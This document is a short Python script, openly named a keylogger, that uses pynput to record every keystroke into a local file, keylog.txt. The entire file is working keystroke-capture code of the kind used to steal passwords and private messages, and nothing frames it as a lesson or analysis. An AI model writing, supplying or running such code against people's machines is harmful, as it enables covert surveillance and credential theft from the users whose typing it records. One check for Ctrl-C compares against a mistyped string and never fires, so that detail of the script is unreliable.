import os
from pynput.keyboard import Listener

log_file = "keylog.txt"

def on_key_press(key):
    try:
        key_str = str(key.char)
        if key_str == "'\\x03'": 
            raise KeyboardInterrupt
        with open(log_file, "a") as f:
            f.write(key_str)
    except AttributeError:
        
        if key == key.space:
            key_str = " "
        elif key == key.enter:
            key_str = "\n"
        else:
            key_str = ""
        with open(log_file, "a") as f:
            f.write(key_str)

def main():
    try:
        with open(log_file, "w") as f:
            f.write("Keylogger started...\n")
        with Listener(on_press=on_key_press) as listener:
            listener.join()
    except KeyboardInterrupt:
        print("\nKeylogger stopped. Keystrokes saved in", log_file)

if __name__ == "__main__":
    main()
